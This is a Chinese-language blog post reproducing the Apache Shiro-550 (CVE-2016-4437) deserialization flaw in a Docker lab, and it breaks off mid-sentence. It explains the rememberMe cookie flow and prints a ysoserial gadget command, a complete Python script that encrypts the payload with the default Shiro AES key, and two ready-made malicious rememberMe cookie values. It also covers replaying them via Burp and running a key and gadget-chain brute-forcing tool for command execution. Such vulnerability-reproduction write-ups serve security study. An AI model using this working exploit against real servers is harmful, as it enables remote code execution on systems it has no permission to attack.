<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://lunargod.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://lunargod.github.io/atom.xml"><link rel="alternate" type="application/json" href="https://lunargod.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="java,git,springcloud"><link rel="canonical" href="https://lunargod.github.io/2023/01/29/Apache%20%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><title>Apache Shiro 反序列化 - 漏洞复现 | SABER = = 你越安静 你听到的就越多</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Apache Shiro 反序列化</h1><div class="meta"><span class="item" title="创建时间：2023-01-29 22:09:49"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-01-29T22:09:49+08:00">2023-01-29</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">SABER</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/673845ecd29ded1a8c74e034.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/67384617d29ded1a8c75016a.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/6738468dd29ded1a8c756c5b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/673845fbd29ded1a8c74eb50.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/67384616d29ded1a8c750113.png"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/673a08ecd29ded1a8cd2cf46.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 漏洞复现"><span itemprop="name">漏洞复现</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunargod.github.io/2023/01/29/Apache%20%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="月"><meta itemprop="description" content="你越安静 你听到的就越多, 欢迎来到月的个人博客!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><p><code>Apache Shiro</code> 是一个强大且易用的 <code>Java</code> 安全框架，执行身份验证、授权、密码和会话管理个漏洞被称为 <code>Shiro550</code> 是因为在 <code>Apache Shiro的GitHub</code> 问题跟踪器中，该漏洞最初被标记为第 <code>550</code> 个问题， <code>721</code> 漏洞名称也是由此而来</p><h3 id="shiro-550-cve-2016-4437"><a class="anchor" href="#shiro-550-cve-2016-4437">#</a> Shiro-550 CVE-2016-4437</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hFQVZFTjU2OS9hcnRpY2xlL2RldGFpbHMvMTI1Mzg5OTg3">Shiro 反序列化 Docker 复现</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jvc3NmcmFuay9hcnRpY2xlL2RldGFpbHMvMTMwMTczODgw">shiro550 反序列化漏洞原理与漏洞复现</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elovYXJ0aWNsZS9kZXRhaWxzLzEwODM5MTA3NQ==">shiro550 代码审计复现</span></p><p><code>Apache Shiro&lt;= 1.2.4</code> 框架提供了记住我的功能 <code>RememberMe</code> 省去用户短时间内再次登录输入账号密码；</p><p>登录成功并选择 <code>RememberMe</code> 功能； <code>Shior</code> 会将 <code>cookie</code> 值序列化字节 <code>AES</code> 加密并 <code>base64</code> 编码存储在 <code>Cookie</code> 的 <code>remeberme</code> 字段</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie生成流程:</span><br><span class="line"></span><br><span class="line">登录后用户信息-----&gt;序列化转化为字节----&gt;AES对称加密----&gt;base64编码----&gt;存储remeberme字段cookie</span><br></pre></td></tr></table></figure><p></p><p>勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的 <code>cookie</code> 值进行身份验证，无需登录即可访问，当客户端再次请求服务端时，都会带上这个服务端第一次返回设置的 <code>Set-Cookie</code> 里面的 <code>rememberMe</code> 的密文，让服务端进行身份验证</p><p><img data-src="image/image_PVEHcwVbAd.png" alt></p><p>各种登录情况</p><p><img data-src="image/image_rfsntOP6qa.png" alt></p><h4 id="漏洞原理"><a class="anchor" href="#漏洞原理">#</a> 漏洞原理<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></h4><p>攻击者前期可以使用 <code>Shiro</code> 的 <code>AES</code> 默认密钥或硬编码在源码中的 <code>Key</code> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> 伪造用户的 <code>Cookie</code> ，检索 <code>cookie</code> 中 <code>remeberme</code> 字段未进行过滤操作，，服务端反序列化 <code>Cookie</code> 时触发漏洞，从而执行命令</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回包生成cookie中字段remeberme过程</span></span><br><span class="line"></span><br><span class="line">登录后用户信息-----&gt;序列化转化为字节----&gt;AES对称加密----&gt;base64编码----&gt;存储remeberme字段cookie</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端接收cookie进行经过AES解密Base64解码最后反序列</span></span><br><span class="line"></span><br><span class="line">恶意Cookie的rememberMe----&gt;AES解密---&gt;Base64解码----&gt;反序列化----&gt;执行恶意Cookie携带的命令</span><br></pre></td></tr></table></figure><p></p><h4 id="docker开启环境"><a class="anchor" href="#docker开启环境">#</a> Docker 开启环境</h4><p></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker<span class="operator">-</span>compose up <span class="operator">-</span>d  <span class="operator">/</span><span class="operator">/</span> 启动容器服务</span><br><span class="line"></span><br><span class="line">docker<span class="operator">-</span>compose ps  <span class="operator">/</span><span class="operator">/</span> 查看端口<span class="number">6379</span></span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_SvSTFEc9rD.png" alt></p><p><img data-src="image/image_cd1NN2w0kC.png" alt></p><p><code>GitHUb</code> 下载 ** <code>ysosera</code> ** 一个常用的 <code>Java</code> 反序列化利用工具，用于生成各种常见 Java 库的反序列化 <code>payload</code> 。这些 <code>payload</code> 可以被用于利用反序列化漏洞，执行恶意代码或实现攻击，下载后利用此工具选择生成针对 <code>CommonsBeanutils1</code> 库的反序列化 <code>payload</code> ，也称为 <code>gadget</code> , 工具和加密 <code>Py</code> 需要放在 同一目录下，确保生成的 <code>ser</code> 文件和脚本在同级</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  touch /tmp/succ123 命令含义是在/tmp目录下创建一个名为&quot;saber&quot;的空文件</span></span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/saber&quot;</span> &gt; poc.ser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 注意:  </span><br><span class="line"></span><br><span class="line">ysoserial脚本其实是在利用构造链进行反序列化对应的命令,所以我们要找到链子</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 密匙AES加密 Base64编码后生成的rememberMe,将上方的命令进序列化加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line">def <span class="title function_">encode_rememberme</span><span class="params">()</span>:</span><br><span class="line">    f = open(<span class="string">&#x27;poc.ser&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="comment">// rb 表示以二进制只读模式打开文件，可以读取二进制数据而不会进行字符编码转换</span></span><br><span class="line">    BS = AES.<span class="type">block_size</span></span><br><span class="line">    <span class="variable">pad</span> <span class="operator">=</span> lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="type">bytes</span></span><br><span class="line">    <span class="variable">encryptor</span> <span class="operator">=</span> AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()   </span><br><span class="line">    print(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rememberMe=8ANUo99cQgeGdjpU6YttWIYTdhAD9evj5vLGnzxbYU4dEasCg7Meb7xjRJZ/1WhXE45rheEywUAUCVVuYFzjCPDItyuRgdeVy1s3iwR01Hk/Exm/33xlXQFMpU4IbAkOdRafIz0zxzJ+OzMB6anQ0DCg8+po5wSRDntEZxwOEM+Fo7WHDz61aMJOhvOV7SAGgR1/ZvYI7IoNbvqKxv8ilqsQxj3NRH6RNWNNdMXpTNS565M1pFJh50qPozQr4i+XX1AhZnqw5DgjWW0ZKCjBFmPgg3KfELf29/mMSC18pDy25OVINP/G23M+nLyicTUzV1nhbkyfqMcVwrpeyUgukj4KiDijpj8i58Hv1D8zGL7IgFW44OhpmEb79ex7QYUXPPy8iNYBrLrp4sa35c4Ct+UBC+tvLK+wzNaRwe0RTG2PCCjl7dUMBvy8I2721lZw61OUc0PjhET8T2EPRZjR34IRrzjZxxbvTjF0FVdl3ktYQv+guvqBvlP7hlcSpA9f1/oUz0CRA9r9FFRskE++XEb7cM/3zZdqeHAbiW6S/K6t+Fg7pmxoxXD71KnMBNBzxqRJJHMzYIKqzrXNUXgakE2GRAjgEeBpcDMKBCnHV02UKRz8tE29dL+R8JAcvSureN+M5srD1OwY9enVX5gzh/mu8on/t+mAOUPTfyu90ScKEKmm9UzNsNxwo5Jr0SwGGsfCW/wDHxnG3qfhS2mnICCtbQq+xSkoQNQ4smYiv+twcMvTrMU1R4o4dfckslLRFFQn+<span class="number">3</span>/O1oOha6Q6z2Z885K7W1urvuGvsKLKjxru4CdTSDtNpW2qd6o6aysE7/Vn1NRBcyZtnI9pmInrFY4yr7Kd0gAVh58Zk1JNdm+NPa6PsesXzT1PpT1tT1scd0afjxp6Dm228uIAD5rU98zh71MOihbKKLvpU5y9tOgI+F32Qo9iMbUrAfR0xR5ab68whEpQLvobM/xSkAEg6xmlqKq4qAyR60+2DQYibLUr0euvxI7I37b7ZEiauPoTRvjQD6FpIJ800uQ2Z0T7F9dRAy2HI3bsL0MlLn/obAcm+hozHiXHG3BUroNfg9zU1SolAGc+e/JdrUBrxX86chqtOHw/joy1Gv2J737pC1c7WlLzIT4aBvNlcB7tsuy6MJKMUVeGQxGLoY6jvCvkNOEFQduDphaG/lmw1YpUJpIToQvTrDZp6EFSlVLs1kgHMLCWJa1Hzvjj+jK+0pvfe8nVVXAVYp+P6Sh42GI0TfWqD+3xLrdexyMT2pX1Z1DWSnGiZiLE+09hlzqKJUfFavzGmUE9OgxVBt2qjSxjsKEBwTiSxU7r2lUlJCYPI0PLeHOtRlr1wZJgOfh14blhQLvKUMGiVPSSrU5ut3Dc/2zwYOyHaNBGq2jl4Q7vnMF9iWdbUjuimcqO+ULlsnL2Q7l1Wl5JrNTpCXogWfvA0U0nW4pAg/Z6yyEjlwkfpq7xYdYep4uqExj9GFZnXwBEPwMZNEpA7WuymBRm6vFtDhgFU/rixKRIdu7Lwk1UrQdJ79BAKIIZt9Ke/y341wZZjOGnw7ZZlgIdxwlHYZCtOR77RL9qoVnoKFTZZc1bzFGrCfuN+DoYcuCremc46pB8ozu+beVguLncbYw/tIMbVJ5hnbIamPRD3owabpleXKSdRdLLzzGeY1nkg/nLE8O5mmYFnTV2aWSSKiyxZEvp+UGaQ1arkanYIw1wv7EFCxljHiXibxwU39ZtigG+9LEo150eJyBj6ka9rw4T5q6oQmrbuN1QbheGKvFeIvUAIQAmlBRm2SWITj7SZycSic0KqhJk0fYGaRtnkRadVq6CBuxE9ojI0csLT6HpMsR5ZJV3vKCxe+q4NP8Skq4WRt5tsXuasMspInNHbmQIWj84O2REZYUzMgchuvdlqWH+3CALhPeE8vPyrRAXSfzwPxJr57Q6yEfgPqs9FkoFF8RRrDgYB5XX0lFyCgYJwfhParvn2RYFf1q4QaexdjdONLnJUuiiQFzN1MwXu7F8iQt/EMo/56kpdjhG4rAdldMq4su7MwViuYiFTR5MVI5aMtM/N+J9g5gnURbusBvsp79SUhiqIR+X/DJwcPtqcXGLoqzL5xJC4piK4Bj+bPJ+RS0K7mh1nwogHEQMj22yzcBA6tQHo+YAMuvGg9WWrYa2OtxyMQjY0X73iQb276zNqMQdOpa/uprpR8m8aMKRyh8ZKJMzX50q5c47s4FWwlm3F6mmjrIWhGoYnuQsLstBt1VW3Cmjx96o/KLw9MZSthSnG0heVx+snB8BNHcpzISOzUV8UyZYvS+rN/94Te6Qc10rtUAj6l7f4eq5E0X8kS/Jrj+uOjNZeoydK33YE67ZXzE1G6taOiH1bALzMMH9ZVJRx+/YPcQlH3FJLtlMhSJjE3Y1sJ69tVCFjS0s7j6ZjvhUIvk2v+cL+8lqkjIWVhkheKq21zxnVomjKphGBMTc2EbD6kQJx9ytYG/HoARB3HhQoXLhboacMuWmv7YaAMlSqzx7ZXoSN6aW/qmUtj5t6FX5s51MuIGNAI1zK80WHZ8qrWQIk0CdkyO7hsagepasbzhYuq+Y04sRsTj03cq441atLSTjYbvGd0Am1eW45v0VRwrl8v/TMsJuVxVdmQtOipNneyPmQOArUq84o5LYWkF9Kyv7JDTVSLt8sgzhxsApXnZc3LAT7CsNC4rxX/lnAfDfJvcovGX2+33nXapLLTEwTE59xZyEHMErHgtUEh1v9GzBOoT0hYPqzNHxLezJwcpF7UkkptrXNgKn38ZHzjWQQiN0olPujCyJa9r6tudWc6g4f8SiwzOBaRFHd8WGUE2cq05+Frg2hLszbaWgh59qVthr+p+qPI+7hW5vDVcuBj+aYxkEMzcWB9nRzfQa6YXjdZYySlmfQZGas8DPt4j/nWujg25U1UVijMyHczX1Sue+HAAO8oGTmPPt8LDxbki8tT7uarff1S7ziWTtFR3mFaHSZNY8joAWf2ZPuhLRHITyZeB3Jvn/H4jU3tsmcbiDfyPwpfnak/XsYgfJsfbuY21jRvqPx4B9QVYht3FLRZb7Ra7rgqrKYREm0ML5gzghz2Iosw4eJulBlx+c7ilVtQ8tf7qEkmIgoofDYHXTnM6i8TysKUhFeE+1zaB5KijKhPUtMRjeQ+MOkBiPajSUz7YNgmZBlYtPqjnNP91xueycybd8VJON8HMliX7WDVpr3kED4Tlt49Vxntst+2nPLtzZeAbXK4sFOBilZeCoXl6Adfvy4QCcvFlaBrEx3RaijvSXDWKVTN0z0+zLyrrPmc8ddHFUWHTuhpqYeRd/h9+CnbR/9FKk3Wif00m2gMVkxiGPeJ1nBlnpCE8xH8tCEPD3H+4VgjG20nmp40/MvPlwhg4iRmxizm8B7PFtXFxSiTSMjP5RfOyUCokXbOMANv2UYvriCfNWooER5jK70Ikzm0arjhH1JMiZcVX/ndlKRFQMy/1XV7yM8WPGx6jet4DCud8ENUI36wCIgbbOvlF/h98KSFbsELvY4lkUSrk7m6YJUDkV5Ymuwx7ORrQaEuOGc9DmMTTFs9MwLUj22HYdC+lJOF07dOAfvVcBxvb3y+aK8eth/rpwidOApBRK/lrcW8KbgLr+k4oSTlr1UXSwNfyxEfMb3QaUMHZWiaPgd0A/p3SOFTjfmsMEo2aWs2F/IJXHBO3aEnHSerykvIZhOIfkd2BSXGmAg==</span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_aXy5qHwKga.png" alt></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig命令</span><br><span class="line"></span><br><span class="line">rememberMe=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</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><h4 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h4><p>账户密码随便输入并勾选记住密码， <code>BP</code> 抓包，加密文件生成的 <code>rememberMe</code> 替换到登录的请求包里，直接发送成功的话将在 <code>tmp</code> 目录下创建我们所写的空文件</p><p><img data-src="image/image_E1_BawIqOb.png" alt></p><p>字段 <code>rememberMe</code> 没有出现在 <code>cookie</code> 的话就手动添加 登录不勾选此字段 但是 <code>cookie</code> 不添加 <code>rememberMe</code> 同样能加入文件，选择和不选择两种情况都尝试过，只要主动添加了此字段配合工具就可以成功写入文件</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 99d2973f37e9 /bin/bash   <span class="comment">//容器ID</span></span><br><span class="line">cd /tmp</span><br><span class="line">ls   <span class="comment">// 列出文件</span></span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_rXTpWKb9Hg.png" alt></p><p><img data-src="image/image_OgdyEymI_u.png" alt></p><p>注意不管 <code>rememberMe</code> 字段添加与否只要登录了响应包就会出现 <code>Set-Cookie: rememberMe=deleteMe;</code></p><p>主动添加字段后再发送会出现两个相同的字段</p><p><img data-src="image/image__PZhT0qbeq.png" alt></p><h4 id="工具复现"><a class="anchor" href="#工具复现">#</a> 工具复现</h4><p><code>GitHub</code> 下载了两款工具，原理感觉都是报名默认的密匙，直接运行 <code>jar</code> 包是不行的， <code>jdk11</code> 后就需要手动的去下载和当前 <code>jdk</code> 版本一致的 <code>javafx</code> 运行命令如下，配置 <code>javafx</code> 运行 <code>jar</code> 包</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java --<span class="keyword">module</span>-path E:\Java资源\javafx\javafx-sdk-<span class="number">11.0</span><span class="number">.1</span>\lib </span><br><span class="line">--add-modules javafx.controls,javafx.fxml -jar .\shiro_attack-<span class="number">4.7</span><span class="number">.0</span>-SNAPSHOT-all.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_c3KJTJx-Fr.png" alt></p><p>点击 “检测当前密钥”=&gt;“爆破密钥” 成功出现密匙，然后我们点击 “检测当前利用链”、“爆破利用链及回显”，就可以看到检测日志模块，出现了 “发现构造链: <code>xxxx</code> 回显方式： <code>xxx</code> ”，并提示我们请尝试功能区利用</p><p><img data-src="image/image_EEgYtNsUPe.png" alt></p><p>命令执行模块深入对应命令就成功的进行 